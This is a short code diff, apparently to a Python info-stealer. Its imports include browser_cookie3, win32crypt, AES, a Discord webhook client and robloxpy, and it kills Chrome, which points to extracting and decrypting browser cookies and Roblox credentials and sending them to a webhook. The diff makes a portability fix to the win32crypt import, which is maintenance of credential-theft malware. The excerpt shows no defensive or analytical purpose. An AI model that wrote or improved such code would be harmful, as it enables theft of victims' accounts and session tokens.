@@ -5,7 +5,6 @@ import browser_cookie3
 import sqlite3
 import subprocess
 import shutil
-import win32crypt
 from Crypto.Cipher import AES
 from discordwebhook import Discord
 import httpx
@@ -15,6 +14,10 @@ import robloxpy
 
 # Check if the current system is Windows
 is_windows = os.name == 'nt'
+
+# Conditional import for win32crypt only on Windows
+if is_windows:
+    import win32crypt
 
 try:
     subprocess.call("TASKKILL /f /IM CHROME.EXE")
